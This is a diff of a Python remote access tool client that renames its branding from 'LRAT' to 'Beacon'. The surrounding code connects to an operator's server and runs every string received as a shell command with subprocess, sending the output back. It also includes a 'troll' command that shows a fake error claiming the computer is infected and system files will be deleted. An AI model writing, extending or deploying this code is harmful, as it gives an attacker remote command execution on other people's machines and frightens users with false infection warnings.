@@ -18,19 +18,19 @@ import sys
 def __main__():
     os.system("clear")
     print(Fore.LIGHTCYAN_EX+" --] ----------------------------------------- [-- "+Style.RESET_ALL)
-    print(Fore.LIGHTCYAN_EX+"|"+Style.RESET_ALL+" LRAT Client"+Fore.LIGHTCYAN_EX+" |")
+    print(Fore.LIGHTCYAN_EX+"|"+Style.RESET_ALL+" Beacon Client"+Fore.LIGHTCYAN_EX+" |")
     print(Fore.LIGHTCYAN_EX+" --] ----------------------------------------- [-- "+Style.RESET_ALL)
 
     print(Fore.LIGHTBLUE_EX+"Local IP -  A local or internal IP address is used inside a private network to locate the computers and devices connected to it.")
     print("To view your Local IP Address..")
     print(" - On Unix/Linux :: Open Terminal & type 'ifconfig'. You will see it there.")
     print(" - On Windows :: Open Command Prompt & type 'ipconfig'. You will see it there as IPv4 Address."+Style.RESET_ALL)
-    host = input(Fore.LIGHTWHITE_EX+"[ ! ] Enter IP of the System Running LRAT Server : ")
+    host = input(Fore.LIGHTWHITE_EX+"[ ! ] Enter IP of the System Running Beacon Server : ")
     port = 415
 
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-    input("[ i ] Host and Port Set. Press Enter to Try and Connect to LRAT Server.")
+    input("[ i ] Host and Port Set. Press Enter to Try and Connect to Beacon Server.")
 
 
     def server_management():
@@ -58,7 +58,7 @@ def __main__():
                 webbrowser.open_new("http://lrat.co.nf")
             elif(data == "troll"):
                 server.send("OK, will do it.".encode())
-                messagebox.showerror("SYSTEM ERROR", "Computer Infected by LRAT now will DELETE System FILES!")
+                messagebox.showerror("SYSTEM ERROR", "Computer Infected by Beacon now will DELETE System FILES!")
             else:
                 proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                 var_stdout = proc.stdout.read() + proc.stderr.read()
